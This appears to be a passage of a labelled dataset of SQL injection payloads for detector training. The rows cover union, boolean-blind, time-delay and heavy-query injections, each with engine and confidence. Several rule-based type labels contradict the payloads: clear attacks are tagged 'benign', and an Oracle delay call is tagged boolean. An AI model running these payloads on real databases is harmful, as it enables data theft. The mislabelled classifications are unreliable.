row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3252,"1%' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3253,"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'cdaq' like 'cdaq",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
3254,"1 ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3255,1' ) ) as jzoh where 6484 = 6484 and 7364 = 4233--,1,,boolean_blind,generic,0.95,6484 = 6484 and detected — boolean_blind injection (priority 8) on generic,rule-based
3256,"1 ) where 2781 = 2781 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
3257,"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",1,,boolean_blind,generic,0.95,1266 = 1266 or detected — boolean_blind injection (priority 8) on generic,rule-based
3258,1 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- knpw,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3259,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3260,1 where 3802 = 3802 and 2006 = 2006,1,,boolean_blind,generic,0.95,3802 = 3802 and detected — boolean_blind injection (priority 8) on generic,rule-based
3261,"-4355"" ) ) ) or 9323 = 9323#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3262,"1"" ) ) as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,boolean_blind,generic,0.95,3949 = 3949 and detected — boolean_blind injection (priority 8) on generic,rule-based
3263,1 ) ) as trin where 8843 = 8843,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3264,1'|| ( select 'xdzp' from dual where 5786 = 5786 and ( 3020 = 3020 ) *6703 ) ||',1,,boolean_blind,oracle,0.95,5786 = 5786 and detected — boolean_blind injection (priority 8) on oracle,rule-based
3265,-3881 ) ) ) union all select 4438--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3266,select sleep ( 5 ) and ( ( ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3267,1'+ ( select 'dkxk' where 1241 = 1241 waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3268,"1"" ) and elt ( 6651 = 1172,1172 ) and ( ""zfkb"" like ""zfkb",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
3269,"1"" ) and 6565 = 2647 and ( ""mrge"" like ""mrge",1,,boolean_blind,generic,0.95,"6565 = 2647 and, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
